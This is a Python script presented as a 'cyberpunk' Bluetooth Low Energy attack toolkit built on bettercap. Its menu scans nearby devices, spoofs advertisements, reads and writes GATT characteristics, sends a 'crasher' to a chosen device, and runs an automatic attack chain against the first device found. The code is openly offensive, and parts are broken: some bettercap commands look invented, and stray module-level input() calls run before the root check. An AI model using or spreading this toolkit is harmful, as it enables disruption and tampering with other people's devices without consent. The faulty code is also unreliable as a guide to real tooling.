
#!/usr/bin/env python3
# ZeroSync v3.5 Final — Cyberpunk Bluetooth Toolkit with Bettercap Integration

import os
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from sys import exit

console = Console()
scanned_devices = []

def run_bettercap_command(command):
    try:
        result = subprocess.check_output(["sudo", "bettercap", "-eval", command], stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"[ERROR] {e.output.strip()}"

def update_scanned_devices():
    output = run_bettercap_command("ble.show")
    scanned_devices.clear()
    for line in output.splitlines():
        if "BLE" in line and ":" in line:
            scanned_devices.append(line.strip())

def show_scanned_devices():
    if not scanned_devices:
        console.print(Panel("[red]No scanned BLE devices.[/red] Try running a scan first.", border_style="red"))
        return
    table = Table(title="Scanned BLE Devices")
    table.add_column("Index", style="cyan")
    table.add_column("Device Info", style="green")
    for i, dev in enumerate(scanned_devices):
        table.add_row(str(i), dev)
    console.print(table)

def select_device_index():
    if not scanned_devices:
        console.print("[red]No scanned devices to target.[/red]")
        return None
    show_scanned_devices()
    idx = Prompt.ask("Select device index", default="0")
    try:
        return scanned_devices[int(idx)]
    except:
        return None

def ble_spoof_advertisement():
    name = Prompt.ask("Spoofed Name", default="ZeroSync")
    uuid = Prompt.ask("UUID (default: 1234)", default="1234")
    result = run_bettercap_command(f"ble.advertise uuid {uuid} name {name}")
    console.print(result)

def ble_gatt_fuzz():
    device = select_device_index()
    if not device:
        return
    mac = device.split()[1]
    console.print(f"[cyan]Starting GATT fuzz on:[/cyan] {mac}")
    result = run_bettercap_command(f"set ble.target {mac}; ble.gatt.read; ble.gatt.write")
    console.print(result)

def ble_crasher():
    device = select_device_index()
    if not device:
        return
    mac = device.split()[1]
    result = run_bettercap_command(f"set ble.target {mac}; ble.crash")
    console.print(result)

def persistent_chain():
    console.print("[green]Executing persistent chain: Scan → Target → Spoof → GATT Fuzz[/green]")
    run_bettercap_command("ble.recon on")
    update_scanned_devices()
    if scanned_devices:
        device = scanned_devices[0]
        mac = device.split()[1]
        run_bettercap_command(f"set ble.target {mac}; ble.advertise uuid 1234 name 'ZeroSync'; ble.gatt.read; ble.gatt.write")
        console.print(f"[cyan]Attack chain completed on {mac}[/cyan]")
    else:
        console.print("[red]No devices found.[/red]")

def bettercap_bridge():
    console.print(Panel("[bold cyan]Bettercap Bridge[/bold cyan] - Type 'exit' to quit"))
    while True:
        user_cmd = Prompt.ask("[bold magenta]bettercap >[/bold magenta]")
        if user_cmd.lower() in ["exit", "quit"]:
            break
        result = run_bettercap_command(user_cmd)
        console.print(result)

def main_menu():
    while True:
        console.clear()
        console.print(Panel("[bold green]ZeroSync v3.5 — BLE Cyberpunk Toolkit[/bold green]", subtitle="with Bettercap Integration"))
        console.print("[1] Start BLE Recon Scan")
        console.print("[2] View Scanned Devices")
        console.print("[3] BLE Advert Spoof")
        console.print("[4] BLE GATT Fuzz (Select Device)")
        console.print("[5] BLE Crasher (Select Device)")
        console.print("[6] Run Persistent Attack Chain")
        console.print("[7] Open Bettercap Command Bridge")
        console.print("[0] Exit")

        choice = Prompt.ask("Select option")
        if choice == "1":
            run_bettercap_command("ble.recon on")
            update_scanned_devices()
            console.print("[green]Scan complete.[/green]")
        elif choice == "2":
            show_scanned_devices()
        elif choice == "3":
            ble_spoof_advertisement()
        elif choice == "4":
            ble_gatt_fuzz()
        elif choice == "5":
            ble_crasher()
        elif choice == "6":
            persistent_chain()
        elif choice == "7":
            bettercap_bridge()
        elif choice == "0":
            console.print("[cyan]Exiting ZeroSync.[/cyan]")
            break
        else:
            console.print("[red]Invalid option[/red]")
input("Press Enter to continue...")
input("Press Enter to continue...")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[red]Run this script with sudo.[/red]")
        exit(1)
    main_menu()
